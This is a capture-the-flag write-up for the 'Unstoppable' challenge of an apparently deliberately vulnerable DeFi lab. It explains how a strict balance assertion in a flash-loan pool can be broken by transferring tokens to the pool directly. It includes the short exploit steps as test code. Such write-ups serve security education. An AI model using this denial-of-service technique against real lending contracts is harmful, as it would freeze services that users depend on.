# Challenge 1 — Unstoppable

## Description

In the lending pool `UnstoppableLender`, offering flash loans for free, there are two functions:

- `depositTokens` to transfer tokens from sender to the pool.
-  `flashLoan` function to initiate the flash loan.

In the `flashLoan` function, the process is:

1. Check that the `borrowAmount` is at least 1 token:
	```solidity
	require(borrowAmount >  0, "Must borrow at least one token");
	```

2. Get the balance of the pool in `damnValuableToken` token:
	```solidity
	uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
	require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
	```

3. Verify that the obtained balance is equal to the global variable `poolBalance`
	```solidity
	assert(poolBalance == balanceBefore);
	```

## Vulnerability

The variable `poolBalance` is updated only if the `depositTokens` is used to deposit tokens.
Therefore, if tokens are deposited to the contract address via the `transfer` method directly, then `poolBalance` will not be updated.
The balance of the contract having increased anyway, the value `balanceBefore` will become different from `poolBalance` and the test `assert(poolBalance == balanceBefore)` will not pass.

## How to exploit?
- Initial token balance of the pool is 1000000.
- Initial token balance of the attacker is 100.
- Tokens are transferred from the attacker to the pool via:
	```solidity
	await  this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, {
	from:  attacker,
	});
	```
- The call to `flashLoan` now reverts
	```solidity
	await this.receiverContract.executeFlashLoan(10, { from:  someUser })
	```
